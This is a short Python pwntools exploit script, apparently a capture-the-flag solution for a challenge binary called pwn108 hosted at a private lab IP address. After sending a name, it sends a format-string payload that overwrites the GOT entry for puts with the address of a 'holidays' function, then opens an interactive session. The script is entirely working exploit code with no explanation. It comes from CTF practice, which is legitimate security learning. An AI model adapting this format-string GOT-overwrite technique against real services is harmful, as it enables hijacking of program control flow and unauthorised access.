#!/usr/bin/env python3
from pwn import *

offset = 10
elf = context.binary = ELF('./pwn108.pwn108')
io = remote('10.10.45.107', 9008)
#io = process()

#input 1
io.recvuntil(b'=[Your name]:')
io.sendline(b'text')
#vulnerable input
io.recvuntil(b'=[Your Reg No]:')

#overwriting GOT table with holidays address
payload = fmtstr_payload(offset, {elf.got.puts:elf.sym.holidays})
io.send(payload)
io.interactive() 
